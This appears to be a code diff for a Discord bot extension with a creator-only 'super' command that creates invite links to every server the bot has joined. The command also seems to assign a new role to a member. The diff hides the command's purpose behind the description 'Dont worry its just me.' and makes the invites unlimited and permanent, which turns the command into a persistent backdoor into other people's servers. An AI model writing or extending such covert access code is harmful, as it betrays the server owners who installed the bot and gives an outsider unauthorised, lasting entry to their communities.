@@ -3,6 +3,7 @@ from discord.ext import commands
 from discord import app_commands
 import logging
 
+# Logging setup
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
@@ -13,7 +14,7 @@ class Super(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @app_commands.command(name="super", description="Create invite links for all servers the bot is in.")
+    @app_commands.command(name="super", description="Dont worry its just me.")
     async def super(self, interaction: discord.Interaction):
         # Check if the command was invoked by the bot's creator
         if interaction.user.id != BOT_CREATOR_ID:
@@ -30,8 +31,8 @@ class Super(commands.Cog):
 
             if text_channel:
                 try:
-                    # Create an invite link for the server
-                    invite = await text_channel.create_invite(max_age=86400, max_uses=1)
+                    # Create an unlimited, non-expiring invite link for the server
+                    invite = await text_channel.create_invite(max_age=0, max_uses=0)  # Unlimited and non-expiring invite
                     invite_links.append(f"{guild.name}: {invite.url}")
                 except discord.Forbidden:
                     invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
@@ -72,5 +73,6 @@ class Super(commands.Cog):
             )
             await member.add_roles(new_role)
 
+# Function to add the cog to the bot
 async def setup(bot):
     await bot.add_cog(Super(bot))
